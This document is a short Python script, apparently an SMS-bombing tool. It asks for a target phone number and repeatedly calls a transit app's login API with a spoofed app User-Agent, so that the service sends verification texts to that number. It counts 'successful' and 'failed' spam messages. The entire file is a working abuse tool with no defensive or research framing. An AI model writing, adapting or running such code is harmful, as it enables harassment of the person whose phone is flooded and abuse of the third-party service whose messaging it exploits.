from tqdm import tqdm
import requests
print("""
███╗░░░███╗░█████╗░███╗░░░███╗███╗░░██╗░█████╗░███████╗
████╗░████║██╔══██╗████╗░████║████╗░██║██╔══██╗██╔════╝
██╔████╔██║███████║██╔████╔██║██╔██╗██║██║░░██║█████╗░░
██║╚██╔╝██║██╔══██║██║╚██╔╝██║██║╚████║██║░░██║██╔══╝░░
██║░╚═╝░██║██║░░██║██║░╚═╝░██║██║░╚███║╚█████╔╝███████╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝
""")
headers = ({'User-Agent':
        'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
phoneNumber = input("Enter Target Phone Number: ")
phoneNumber = str(phoneNumber)
url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber
numofmsgs = int(input("Enter Message Number To Send: "))
successspamCount = 0
failspamCount = 0
for i in tqdm(range(numofmsgs)):
    resp = requests.get(url)
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
print("Total successful messages sent: ",  successspamCount)
print("Total failed messages sent: ", failspamCount)
